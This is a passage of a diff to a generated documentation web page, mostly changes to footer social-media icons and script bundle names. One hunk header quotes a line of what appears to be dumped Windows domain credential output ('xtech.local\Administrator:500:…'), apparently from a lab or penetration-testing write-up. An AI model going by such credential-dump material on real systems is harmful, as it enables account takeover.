+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
     
       
       
-        
-        
-      
-      <a href="https://instagram.com/kf0k" target="_blank" rel="noopener" title="instagram.com" class="md-footer-social__link">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
-      </a>
+    
+    <a href="https://instagram.com/kf0k" target="_blank" rel="noopener" title="instagram.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+    </a>
+  
+    
     
       
       
-        
-        
-      
-      <a href="http://linkedin.com/in/kf0k-mohammed-al-kalbani" target="_blank" rel="noopener" title="linkedin.com" class="md-footer-social__link">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
-      </a>
     
-  </div>
-
+    <a href="http://linkedin.com/in/kf0k-mohammed-al-kalbani" target="_blank" rel="noopener" title="linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+</div>
+      
     </div>
   </div>
 </footer>
@@ -1632,10 +1661,11 @@ xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b5
     <div class="md-dialog" data-md-component="dialog">
       <div class="md-dialog__inner md-typeset"></div>
     </div>
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.8397ff9e.min.js", "version": null}</script>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs"], "search": "../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.1e84347e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6df46069.min.js"></script>
       
     
   </body>
